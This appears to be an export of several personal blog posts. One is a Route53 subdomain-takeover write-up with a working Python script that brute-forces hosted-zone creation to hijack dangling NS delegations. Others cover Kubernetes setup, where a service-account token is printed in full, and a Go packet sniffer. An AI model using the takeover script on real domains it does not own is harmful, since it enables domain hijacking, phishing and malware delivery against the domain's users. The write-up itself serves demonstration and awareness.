[{"content":"DNS Hijacking a Cloud Provider. Little is discussed around the nature of DNS hijacking and methods to protect and prevent against these types of attacks. While they are somewhat uncommon they are possible in certain circumstances.\nDNS Hijacking can occur in several ways inside a cloud provider environment we will discuss both techniques but take a deeper dive in the DNS based approach.\n Hijacking a Subdomain allocated to an Elastic IP address that has been released but not deallocated or dereferenced from DNS. Hijacking the delegation set on a Zone record that has yet to be set or was orphaned from a hosted zone.  Lets start with a basic Zone configuration. You will notice we have two configured.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  { \u0026#34;ResponseMetadata\u0026#34;: { \u0026#34;RequestId\u0026#34;: \u0026#34;bf748377-2d28-4cb0-a083-2e59893d4a09\u0026#34;, \u0026#34;HTTPStatusCode\u0026#34;: 200, \u0026#34;HTTPHeaders\u0026#34;: { \u0026#34;x-amzn-requestid\u0026#34;: \u0026#34;bf748377-2d28-4cb0-a083-2e59893d4a09\u0026#34;, \u0026#34;content-type\u0026#34;: \u0026#34;text/xml\u0026#34;, \u0026#34;content-length\u0026#34;: \u0026#34;1075\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;Mon, 09 Mar 2020 21:24:27 GMT\u0026#34; }, \u0026#34;RetryAttempts\u0026#34;: 0 }, \u0026#34;HostedZones\u0026#34;: [ { \u0026#34;Id\u0026#34;: \u0026#34;/hostedzone/ZXMG2Y75QXFTA\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;twestdev.com.\u0026#34;, \u0026#34;CallerReference\u0026#34;: \u0026#34;447E09A2-A839-05FF-9EC0-79C2A92642D3\u0026#34;, \u0026#34;Config\u0026#34;: { \u0026#34;PrivateZone\u0026#34;: false }, \u0026#34;ResourceRecordSetCount\u0026#34;: 6 }, { \u0026#34;Id\u0026#34;: \u0026#34;/hostedzone/Z2UGQDVTG9409L\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;test.twestdev.com.\u0026#34;, \u0026#34;CallerReference\u0026#34;: \u0026#34;2020-03-09 14:17:39.891332\u0026#34;, \u0026#34;Config\u0026#34;: { \u0026#34;Comment\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;PrivateZone\u0026#34;: false }, \u0026#34;ResourceRecordSetCount\u0026#34;: 2 } ], \u0026#34;IsTruncated\u0026#34;: false, \u0026#34;MaxItems\u0026#34;: \u0026#34;100\u0026#34; }   In Route53 we set up zone delegation from twestdev.com using NS records for test.twestdev.com that point to the new hosted zones we created.\nAmazon generates these nameservers dynamically, the key here being: along with the zone file. According to AWS\u0026rsquo;s official documentation, the nameserver \u0026amp; zone data, will only be valid for the hosted zone. This means that no other hosted zones in route53 can use these nameservers delegations once they are set up. However, this concept can be exploited as discussed below.\nTaking a look at our Primary Zone records you will see zone delegation is set up.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  { \u0026#34;Name\u0026#34;: \u0026#34;test.twestdev.com.\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;NS\u0026#34;, \u0026#34;TTL\u0026#34;: 300, \u0026#34;ResourceRecords\u0026#34;: [ { \u0026#34;Value\u0026#34;: \u0026#34;ns-364.awsdns-45.com.\u0026#34; }, { \u0026#34;Value\u0026#34;: \u0026#34;ns-625.awsdns-14.net.\u0026#34; }, { \u0026#34;Value\u0026#34;: \u0026#34;ns-2045.awsdns-63.co.uk.\u0026#34; }, { \u0026#34;Value\u0026#34;: \u0026#34;ns-1101.awsdns-09.org.\u0026#34; } ] }  \nGreat so now if we create a Record in the new hosted Zone it should have zone delegation and be able to reply to the DNS request.\nJSON used to create record using AWS CLI:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  { \u0026#34;Comment\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Changes\u0026#34;: [{ \u0026#34;Action\u0026#34;: \u0026#34;CREATE\u0026#34;, \u0026#34;ResourceRecordSet\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;hi.test.twestdev.com\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;TXT\u0026#34;, \u0026#34;TTL\u0026#34;: 60, \u0026#34;ResourceRecords\u0026#34;: [{ \u0026#34;Value\u0026#34;: \u0026#34;\\\u0026#34;@helloworld\\\u0026#34;\u0026#34; }] } }] }  \nStatus:\n1 2 3 4 5 6 7 8  { \u0026#34;ChangeInfo\u0026#34;: { \u0026#34;Id\u0026#34;: \u0026#34;/change/C048704510OFKBBIH5SVY\u0026#34;, \u0026#34;Status\u0026#34;: \u0026#34;PENDING\u0026#34;, \u0026#34;SubmittedAt\u0026#34;: \u0026#34;2020-03-09T21:55:27.791Z\u0026#34;, \u0026#34;Comment\u0026#34;: \u0026#34;\u0026#34; } }  \nResults:\n1 2  dig +short TXT hi.test.twestdev.com \u0026#34;@helloworld\u0026#34;  \nSo now that we are all set up, lets try to execute this attack. For it to work correctly the Zone delegation must be misconfigured. As I originally stated, this is only possible under certain circumstances. The main reason this happens is due to stale references such as stale NS records that point to nameservers that are not active for the hosted zone.\nFirst lets, on purpose, remove the name records (essentially deprovision the Zone).\nCommand:\n1 2 3  response = client.delete_hosted_zone( Id=\u0026#39;/hostedzone/Z2UGQDVTG9409L\u0026#39; )  \nResponse:\n1  {\u0026#39;ResponseMetadata\u0026#39;: {\u0026#39;RequestId\u0026#39;: \u0026#39;f18f407a-85b7-48a1-a553-e6ea1a8fa2f1\u0026#39;, \u0026#39;HTTPStatusCode\u0026#39;: 200, \u0026#39;HTTPHeaders\u0026#39;: {\u0026#39;x-amzn-requestid\u0026#39;: \u0026#39;f18f407a-85b7-48a1-a553-e6ea1a8fa2f1\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;text/xml\u0026#39;, \u0026#39;content-length\u0026#39;: \u0026#39;267\u0026#39;, \u0026#39;date\u0026#39;: \u0026#39;Mon, 09 Mar 2020 22:08:01 GMT\u0026#39;}, \u0026#39;RetryAttempts\u0026#39;: 0}, \u0026#39;ChangeInfo\u0026#39;: {\u0026#39;Id\u0026#39;: \u0026#39;/change/C06004932TWG0FZEUHNMW\u0026#39;, \u0026#39;Status\u0026#39;: \u0026#39;PENDING\u0026#39;, \u0026#39;SubmittedAt\u0026#39;: datetime.datetime(2020, 3, 9, 22, 8, 1, 535000, tzinfo=tzutc())}}  \nNow what happens if we recreate another Zone under test.twestdev.com but reference the already set NameServers and SOA? Well it\u0026rsquo;s not just that simple. In fact that is what I first tried to do, this wont work.\nThis is because Zone Data for the Hosted zone is dynamically generated for the NameServer Pool.\nAmazon generates the respective zones files for the Nameservers when they are first spun up and mapped to our zone. So we cant just create a zone and then change the nameservers to what our dangling records are pointing to.\nIn order to assure that the respective zone files are set to be delegated correctly, we need to ensure that when we submit the Zone creation request that the Authoritative nameserver matches what was originally set in the dangling DNS record.\nIn other words, it has to be brute forced. We can do this by utilizing a simple python script to do the dirty work for us.\nScript:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  import boto3, json, datetime, time, sys client = boto3.client(\u0026#39;route53\u0026#39;) targets = [\u0026#34;ns-364.awsdns-45.com\u0026#34;,\u0026#34;ns-625.awsdns-14.net\u0026#34;,\u0026#34;ns-2045.awsdns-63.co.uk\u0026#34;,\u0026#34;ns-1101.awsdns-09.org\u0026#34;] target_domain = \u0026#39;test.twestdev.com.\u0026#39; def cleanup(): js = client.list_hosted_zones() to_delete = [] for i in js[\u0026#39;HostedZones\u0026#39;]: if i[\u0026#39;Name\u0026#39;] == target_domain: to_delete.append(i[\u0026#39;Id\u0026#39;]) print(\u0026#34;Deleting Oraphaned Zones.\u0026#34;) for zone in to_delete: try: res = client.delete_hosted_zone(Id=zone) print(\u0026#34;Deleted Zone:\u0026#34; + str(zone)) except: print(\u0026#34;Couldnt Delete Zone: \u0026#34; + str(zone)) continue count = 1 while True: print(\u0026#34;Searching for NameServer match. Try #\u0026#34; + str(count)) try: response = client.create_hosted_zone( Name=target_domain, CallerReference=str(datetime.datetime.now()), HostedZoneConfig={ \u0026#39;Comment\u0026#39;: \u0026#39;tdubz\u0026#39;, \u0026#39;PrivateZone\u0026#39;: False } ) nameservers=response[\u0026#39;DelegationSet\u0026#39;][\u0026#39;NameServers\u0026#39;] print(\u0026#34;Created Resource\u0026#34;,response[\u0026#39;HostedZone\u0026#39;][\u0026#39;Id\u0026#39;],nameservers) for server in targets: if server in nameservers: print(\u0026#34;Done!\u0026#34;) print(\u0026#34;Created Hosted Zone.\u0026#34;) print(response[\u0026#39;HostedZone\u0026#39;]) sys.exit() else: count += 1 cleanup() except Exception as e: print(\u0026#34;Ran into Exception creating DNS server, ReTrying.\u0026#34;) print(\u0026#34;Exception: \u0026#34; + str(e)) cleanup() continue  \nThe script may take a while, it took me around ~46 tries before I got a nameserver delegated to the zone that matches one of the servers set in the NS record.\nIt may take you longer depending on luck, id say on average probably around ~300 tries.\nScript Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13  Searching for NameServer match. Try #44 Created Resource /hostedzone/Z3FPRRZ2KHWS59 [\u0026#39;ns-1710.awsdns-21.co.uk\u0026#39;, \u0026#39;ns-1077.awsdns-06.org\u0026#39;, \u0026#39;ns-480.awsdns-60.com\u0026#39;, \u0026#39;ns-708.awsdns-24.net\u0026#39;] Deleting Oraphaned Zones. Deleted Zone:/hostedzone/Z3FPRRZ2KHWS59 Searching for NameServer match. Try #45 Created Resource /hostedzone/Z1C0A4QS1XYI36 [\u0026#39;ns-1072.awsdns-06.org\u0026#39;, \u0026#39;ns-111.awsdns-13.com\u0026#39;, \u0026#39;ns-1631.awsdns-11.co.uk\u0026#39;, \u0026#39;ns-1003.awsdns-61.net\u0026#39;] Deleting Oraphaned Zones. Deleted Zone:/hostedzone/Z1C0A4QS1XYI36 Searching for NameServer match. Try #46 Created Resource /hostedzone/Z3RE92J5ZE7JFN [\u0026#39;ns-625.awsdns-14.net\u0026#39;, \u0026#39;ns-1492.awsdns-58.org\u0026#39;, \u0026#39;ns-233.awsdns-29.com\u0026#39;, \u0026#39;ns-1797.awsdns-32.co.uk\u0026#39;] Done! Created Hosted Zone. {\u0026#39;Id\u0026#39;: \u0026#39;/hostedzone/Z3RE92J5ZE7JFN\u0026#39;, \u0026#39;Name\u0026#39;: \u0026#39;test.twestdev.com.\u0026#39;, \u0026#39;CallerReference\u0026#39;: \u0026#39;2020-03-09 18:42:40.146682\u0026#39;, \u0026#39;Config\u0026#39;: {\u0026#39;Comment\u0026#39;: \u0026#39;tdubz\u0026#39;, \u0026#39;PrivateZone\u0026#39;: False}, \u0026#39;ResourceRecordSetCount\u0026#39;: 2}  \nWith the hard work done, we can now create a new TXT record as part of the POC to show we have taken over the domain successfully.\nIm going to create the pwned subdomain to prove the attack was successful.\nJSON used to create record using AWS CLI:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  { \u0026#34;Comment\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Changes\u0026#34;: [{ \u0026#34;Action\u0026#34;: \u0026#34;CREATE\u0026#34;, \u0026#34;ResourceRecordSet\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;pwned.test.twestdev.com\u0026#34;, \u0026#34;Type\u0026#34;: \u0026#34;TXT\u0026#34;, \u0026#34;TTL\u0026#34;: 60, \u0026#34;ResourceRecords\u0026#34;: [{ \u0026#34;Value\u0026#34;: \u0026#34;\\\u0026#34;@pwned\\\u0026#34;\u0026#34; }] } }] }  \nAnd confirming our text record shows up\u0026hellip;\nResults:\n1 2  dig +short TXT pwned.test.twestdev.com \u0026#34;@pwned\u0026#34;  \nWhat does this mean? Well this means that if an attacker is able to find a dangling NS record set in DNS they can theoretically take control of the affected domain.\nThis can be used to trick users, launch malware attacks as well as defame the Domain owner. These are all very serious vulnerabilities High if not Critical.\nThe way to prevent this type of attack is to ensure best practices and sanitization when working with DNS records.\n","description":"","id":0,"section":"blog","tags":null,"title":"DNS Hijacking and SubDomain Takeover.","uri":"https://twestdev.com/blog/2020-03-09-dnshijacking/"},{"content":"Using confd to bootstrap docker files. I have actually seen very little documentation or blog posts about the use of confd. Being able to spin up immutable infrastructure at it\u0026rsquo;s core requires the ability to automate the configuration process on the running container filesystem as well as the host os.To be honest I am new myself to confd, and as I worked on building new security tools, I realized the need for an additional layer of boostraping functions where userdata alone would not cut it.The main benefit I see with confd is the ability to use AWS Secure Token Service to Assume an IAM Role and retrieve remote secrets from Amazon\u0026rsquo;s System Manager Parameter store. These can then be used to update secrets in config files for running container services as well as initially boostrap the host os.\nFor this blog post I will use a quick and dirty examples to get going, but confd can be used in many different ways to yield awesome results. First lets check out the baseline Terraform template used to deploy our containerlinux (CoreOS) host.\n.gist {width:800px !important;}\r.gist-file\r.gist-data {max-height: 500px;max-width: 800px;}\r\rBaseline Terraform template\n\rThis is essentially a one shot script, you could make it clean by setting up modules and such.\nIn summary it creates the necessary SecurityGroups, IAM Roles, Instance Profiles as well as sets up the systemd units and necessary config template files on the host os. It also creates a spot instance request because, you know, I\u0026rsquo;m cheap!\nThe way this is set up is a little advanced in terms of docker and it\u0026rsquo;s interface to the config files. Essentially what I set up is a systemd unit that starts the confd as a container service that mounts into the host filesystem to retrieve the configuration files. After this happens, confd uses ssm as a backend to populate the config file secrets and then finally pushes them out to the volume path locations. This is primarily defined through the toml file specification.\nSample Config file (docker auth).\n1 2 3 4 5 6 7  } \u0026#34;auths\u0026#34;: { \u0026#34;https://index.docker.io/v1/\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;{{getv \u0026#34;${loc}\u0026#34;}}\u0026#34; } } }  \nSample toml file for Docker auth.\n1 2 3 4 5 6  [template] src = \u0026#34;login.conf.tmpl\u0026#34; dest = \u0026#34;/root/.docker/config.json\u0026#34; keys = [ \u0026#34;/dev/dockerlogin\u0026#34;, ]   After launching the terraform script I ssh\u0026rsquo;ed into the CoreOS box to confirm the secrets have been pushed from SSM parameter store.\nThat\u0026rsquo;s it! The full terraform config template can be viewed here!\nhttps://github.com/td4b/CoreOS-Ignition\n","description":"","id":1,"section":"blog","tags":null,"title":"Using confd to bootstrap docker files.","uri":"https://twestdev.com/blog/2019-05-12-confd/"},{"content":"Kubernettes Simple Web app. After brining the cluster up I wanted to experiment with capturing some traffic on the Container level.\nLogging into my node, I deployed and configured my first simple container app (Flask Python Web App).\nIn order to determine the attached network interface I needed to find the POD docker ID.\nFrom the controller -\u0026gt;\n1  kubectl get pod flask-app-6c4c95fddd-nl95g -o json   Then I parsed the Json and found the containerID.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u0026#34;containerStatuses\u0026#34;: [ { \u0026#34;containerID\u0026#34;: \u0026#34;docker://d2a207c49e6dd118685fed88d20d0c3f34af50dfa70c60191486aeb504700d52\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;tdub17/flask-tutorial:latest\u0026#34;, \u0026#34;imageID\u0026#34;: \u0026#34;docker-pullable://tdub17/flask-tutorial@sha256:3fa8278c0255bc9c6acbffd268ed5c500293493a695f74480d32ed3ef800bf9f\u0026#34;, \u0026#34;lastState\u0026#34;: {}, \u0026#34;name\u0026#34;: \u0026#34;flask-app\u0026#34;, \u0026#34;ready\u0026#34;: true, \u0026#34;restartCount\u0026#34;: 0, \u0026#34;state\u0026#34;: { \u0026#34;running\u0026#34;: { \u0026#34;startedAt\u0026#34;: \u0026#34;2018-09-17T04:03:53Z\u0026#34; } } } ],   From there I SSH\u0026rsquo;ed into my Node that has the running container and ran the following:\n1  sudo docker exec d2a207c49e6dd118685fed88d20d0c3f34af50dfa70c60191486aeb504700d52 /bin/bash -c \u0026#39;cat /sys/class/net/eth0/iflink\u0026#39;   Output -\u0026gt;\n14\rThis returned the ID and then after running the following command I was able to easily determine the attached Network Interface.\n1  ip link |grep ^14:   Output -\u0026gt;\n1  14: calie1239ea5782@if4: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default   Now Running the TCPdump command we can inspect the packets flowing into the docker.\n1  tcpdump -i calie1239ea5782   ","description":"","id":2,"section":"blog","tags":null,"title":"Kubernettes pt. 2","uri":"https://twestdev.com/blog/2018-09-19-kubernettesnetworkint/"},{"content":"Remote Procedure Calls. To install software on a running docker container if you gain access to the controller, you can make remote procedure calls to the system.\nFor example, if I need to install curl.\n1  kubectl exec -it --namespace=default flask-app-6c4c95fddd-h7pgv -- bash -c \u0026#34;apt-get update;apt-get -y install curl; curl https://www.google.com \u0026gt;\u0026gt; hello.txt\u0026#34;   Thats it! Pretty Simple! Will be updating this post soon with info on why were interested in this!\n","description":"","id":3,"section":"blog","tags":null,"title":"Kubernettes Remote Procedure Calls.","uri":"https://twestdev.com/blog/2018-09-19-kubernettesrpc/"},{"content":"Kubernettes Pt 1. Pre-reqs.\n Make sure to set up a static IP. Disable VM Swap space.  1  swapoff -a   !! Comment out swap space !!\n1  nano /etc/fstab   Installation on Master \u0026amp; Slave.\nUse Ansible to Automate the Dependency \u0026amp; Configuration process.\nhttps://github.com/kubernetes-incubator/kubespray\nSingle node to test.\n1 2  declare -a IPS=(192.168.1.216) CONFIG_FILE=inventory/mycluster/hosts.ini python3 contrib/inventory_builder/inventory.py ${IPS[@]}   Playbook execution (This will just install the master node, use extra verbosity to troubleshoot errors!).\n1  ansible-playbook -i inventory/mycluster/hosts.ini cluster.yml -b -vvv --private-key=~/.ssh/id_rsa --ask-sudo-pass   After the playbook execution is succesful we can try to access the dashboard by default @\nhttps://192.168.1.217:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login\nWe need to login with the authenticated service account. Notice that we do not access the dashboard via kubectl proxy\nThis is important, as enabling access via kubectl proxy to 0.0.0.0 would allow un-authenticated users to login to the dashboard and have elevated rights to the controller\u0026hellip;\nThe Default service account with the appropriate RBAC needs to be enabled!\n1  kubectl create serviceaccount my-dashboard-sa   1 2 3  kubectl create clusterrolebinding my-dashboard-sa \\  --clusterrole=cluster-admin \\  --serviceaccount=default:my-dashboard-sa   We need to retreive our Key to Login to the Dashboard.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  tdub@node1:~$ kubectl get secret NAME TYPE DATA AGE default-token-5bjhz kubernetes.io/service-account-token 3 4h my-dashboard-sa-token-jjsrh kubernetes.io/service-account-token 3 4h tdub@node1:~$ kubectl describe secret my-dashboard-sa-token-jjsrh Name: my-dashboard-sa-token-jjsrh Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: kubernetes.io/service-account.name=my-dashboard-sa kubernetes.io/service-account.uid=540f3bcc-b9ef-11e8-ba32-000c29fdbf52 Type: kubernetes.io/service-account-token Data ==== ca.crt: 1090 bytes namespace: 7 bytes token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6Im15LWRhc2hib2FyZC1zYS10b2tlbi1qanNyaCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJteS1kYXNoYm9hcmQtc2EiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI1NDBmM2JjYy1iOWVmLTExZTgtYmEzMi0wMDBjMjlmZGJmNTIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpteS1kYXNoYm9hcmQtc2EifQ.cQjLXLEN-paqzP6mMmA-UroZ3sKsGw-xYxn6yEJOuC9kLQ2XdHzlD8MOvEcCLDjgDxVbG-Ddj1J-argIjAaUXZYY6TVB88TfzMwFiE-Puj3MihiTbO1vGlSwXqr958bnTuC_omU6urSKWcTDa-72IFQxEETdrHMyajrzuUrIWNQtdoMczegIbmeHOuiKpxhmlFc61OxKl7tpdYrRlJDHOVeRkKD0do00M2hs06uduIoz_7qAInc_WaQMd7Sj-28n58Yjjw8fDyPF4sp5pEj9tcqrZxY32CxPfNR-fP2BA4iJ-KYKpJvZYCL6mmTKBVpktK4r6nFJVyS6FIfm3FEh3g   And were in!\nRunning Pods on Master node.\n1  kubectl get pods -o wide --all-namespaces   We need to save our Master config data so we can reload after rebooting the system. (For simplicity since I am on ESXi I also just took a snapshot of the Master).\n","description":"","id":4,"section":"blog","tags":null,"title":"Intro to Kubernettes.","uri":"https://twestdev.com/blog/2018-09-15-kubernettesint/"},{"content":"HTTP New Decoding Methods. As mentioned in the previous post. We need to be able to filter out the TCP streams from our HTTP streams, and then implement a more efficient way to decode the packet data.\nWe need to filter the TCP data by flagging our TCP options.\nSince data is being pushed through the TCP stream, we need to filter by the packet flags (TCP options) as they are set.\nEven though we have defined a filter criteria in our packet capture, we still need to filter out some of the raw TCP packets. We can use the TCP flags in the payload (PSH,ACK) in order to inspect the specific HTTP streams. With this we can additionally filter the HTTP methods we want to look at in the Requests such as (GET, PUT, POST).\nWe apply the some logic to filter the payload data based on this simple TCP flag.\n1 2 3  if tcp.PSH == true \u0026amp;\u0026amp; tcp.ACK == true { fmt.Println(string(ipv4.Payload)) }   As well, we implemented a function to parse the HTTP methods we are interested in.\n1 2 3 4 5 6 7 8 9 10  func http_methods(data string) bool { val := false methods := []string{\u0026#34;GET\u0026#34;,\u0026#34;PUT\u0026#34;,\u0026#34;POST\u0026#34;} for _, httpmsg := range methods { if strings.Contains(strings.Split(string(data),\u0026#34;\\n\u0026#34;)[0],httpmsg) == true { val = true } } return val }   In order to decode more efficiently the method go gopacket.NewDecodingLayerParser() was implemented and now our source code looks like -\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; \u0026#34;strings\u0026#34; ) func http_methods(data string) bool { val := false methods := []string{\u0026#34;GET\u0026#34;,\u0026#34;PUT\u0026#34;,\u0026#34;POST\u0026#34;} for _, httpmsg := range methods { if strings.Contains(strings.Split(string(data),\u0026#34;\\n\u0026#34;)[0],httpmsg) == true { val = true } } return val } func main() { // decoder objects \tvar ipv4 layers.IPv4 var eth layers.Ethernet var tcp layers.TCP // Device Handler \thandle, err := pcap.OpenLive(\u0026#34;ens33\u0026#34;, 1600, true, pcap.BlockForever) if err != nil { panic(err) } // Packet Decoder. \tpacketSource := gopacket.NewPacketSource(handle, handle.LinkType()) parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, \u0026amp;eth, \u0026amp;ipv4, \u0026amp;tcp) decoded := []gopacket.LayerType{} for packet := range packetSource.Packets() { _ = parser.DecodeLayers(packet.Data(), \u0026amp;decoded) if tcp.PSH == true \u0026amp;\u0026amp; tcp.ACK == true { if http_methods(string(ipv4.Payload)) == true { payload := string(ipv4.Payload)[20:] fmt.Println(payload) } } else { fmt.Println(\u0026#34;### Encrypted Alert ###\u0026#34;, string(ipv4.Payload)) } } defer handle.Close() }   Notice that now we are getting live packets off the wire e.g. the *pcap.handle is a pointer to our ens33 Ethernet NIC.\nThis is probably not the best, nor the most efficient way to be handling HTTP data. Lets use GoLangs native HTTP libraries for parsing our HTTP headers, that way we can focus on the metadata.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  GET /capstats/bpf.html HTTP/1.1 Host: yawp.biot.com Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 ```bash ```bash GET /site.css HTTP/1.1 Host: yawp.biot.com Connection: keep-alive User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: text/css,*/*;q=0.1 Referer: http://yawp.biot.com/capstats/bpf.html Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9   At this point, we have what we need from a formatting perspective for the raw HTTP metadata. However, we have a problem. What if we want to peel open the session of a HTTPS packet? Notice we added fmt.Println(\u0026quot;### Encrypted Alert ###\u0026quot;, string(ipv4.Payload)) as an else statement that is triggered if the HTTP methods are not found in the payload.\nThis will be true if the payload is encrypted which as can be seen below, even a simple HTTP webpage may have embedded SSL/TLS elements.\nBrowsing to www.bbc.com you will see both HTTP and HTTPS elements, as clicking any one of the articles will redirect to a TLS session.\n1 2 3 4 5 6 7 8 9 10  ### Encrypted Alert ### P�|D)@f����`\u0012��\u0012\u0015\u0002\u0004� ### Encrypted Alert ### �|P����D)@gP\u0010r\u0010�\u001c GET /bbc/bbc/s?name=smp.player.page\u0026amp;app_name=smphtml5\u0026amp;app_type=web\u0026amp;ml_name=echo_js\u0026amp;ml_version=11.0.2\u0026amp;screen_resolution=1319x1094\u0026amp;ns_c=UTF-8\u0026amp;c8=BBC%20-%20Homepage\u0026amp;c9=\u0026amp;c7=http%3A%2F%2Fwww.bbc.com%2F\u0026amp;bbc_mc=ad1ps1pf1\u0026amp;bbc_site=invalid-data\u0026amp;bbc_smp_bv=3.35.7\u0026amp;connection_type=wifi\u0026amp;ns_st_mp=smphtml5\u0026amp;ns_st_mv=2.21.15.5\u0026amp;plugin_url=%2F%2Femp.bbci.co.uk%2Fplugins%2FdfpAdsHTML%2F3.24.4%2Fjs%2FdfpAds.js\u0026amp;action_type=plugin_loaded\u0026amp;action_name=plugin_manager\u0026amp;echo_event=userAct\u0026amp;ns_type=hidden\u0026amp;ns__t=1535998787072 HTTP/1.1 Host: sa.bbc.co.uk User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: */* Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://www.bbc.com/ Connection: keep-alive   1 2 3 4 5 6 7 8  ### Encrypted Alert ### P�|D)@g����P\u0010��\u0026amp;� ### Encrypted Alert ### �|P����D)A�P\u0010u@�\u001c ### Encrypted Alert ### 5�Gá\u0013����\u0001\u0004\u0001\u0003gelfiles\u0004bbci\u0002co\u0002uk\u001c\u0001� \u0001\u0026#34;\u0003gelfiles\u0004bbci\u0002co\u0002ukedgekey\u0003net�2\u0001\u0018e3891\u0004dscf akamaiedge�O�`\u001c\u0001\u0010 \u0001Y\u0019��3�`\u001c\u0001\u0010 \u0001Y\u0019��3)\u0002 ### Encrypted Alert ### �\u001c\u0001�ٵ� �\u0002r\u0010Ha\u0002\u0004�\u0004\u0002 �\u0026amp;��\u0001\u0003\u0003   1 2 3 4 5 6 7 8 9  GET /js/core/bridge3.233.0_en.html HTTP/1.1 Host: imasdk.googleapis.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://emp.bbc.com/emp/SMPj/2.21.15/iframe.html Connection: keep-alive Upgrade-Insecure-Requests: 1   ### Encrypted Alert ### P��.l\u0012~LC]YP\u0010���� ### Encrypted Alert ### ��\u0001�)U�e�\u0002r\u0010�0\u0002\u0004�\u0004\u0002 ���\u0002\u0001\u0003\u0003 ### Encrypted Alert ### ��\u0001���J�\u0002r\u0010�0\u0002\u0004�\u0004\u0002 In order for us to protect a web-applicaiton we need to view the entire payload (in it\u0026rsquo;s pure HTTP form). To decrypt data we need the server(s) private key so we can effectivley man in the middle the TLS session so we can view the raw payload data.\nIn order to do this, we need to capture the TLS Sessions CLIENTHELLO and SERVERHELLO so we can capture the key-exchange (negotiation), more about this on a future post!\n","description":"","id":5,"section":"blog","tags":null,"title":"HTTP New Decoding Methods.","uri":"https://twestdev.com/blog/2018-09-01-httpdecode/"},{"content":"GoPacket Setup and Initial Analysis! Today we will focus on some packet analysis using Golang as our inspection engine.\nOne of my side-project goals is to be able to build a packet analysis tool and Malware/Attack detection engine. I figured that Building this POC in GoLang would be the best choice from a performance \u0026amp; speed perspective.\nOne of the issues I had with getting the Google pcap library to work was an issue with getting the \u0026ldquo;C\u0026rdquo; library interfaces from working properly. After a bit of tinkering I was able to set up the environment for development correctly.\nSetup Instructions:\nObviously we need a 64 bit version of Golang installed and set to path (make sure that is done first!) 1) Install mingw 64 https://sourceforge.net/projects/mingw-w64/ Architecture is: x86_64 (64 bit) 2) Add the gcc.exe to path, e.g. C:\\Program Files\\mingw-w64\\x86_64-8.1.0-posix-seh-rt_v6-rev0\\mingw64\\bin 3) Install npcap: https://nmap.org/npcap/ 4) Install WinPcap Developer tools: https://www.winpcap.org/devel.htm \u0026amp; Save to C:\\ Directory so it is set as: C:\\wpdPack 5) Copy wpcap.dll \u0026amp; packet.dcc to a folder from C:\\Windows\\System32 6) Run \u0026quot;gendef\u0026quot; on both files in the directory you copied those files to this will generate \u0026quot;.def\u0026quot; files for each. 7) Generate the static library files: --\u0026gt; dlltool --as-flags=--64 -m i386:x86-64 -k --output-lib libwpcap.a --input-def wpcap.def --\u0026gt; dlltool --as-flags=--64 -m i386:x86-64 -k --output-lib libpacket.a --input-def 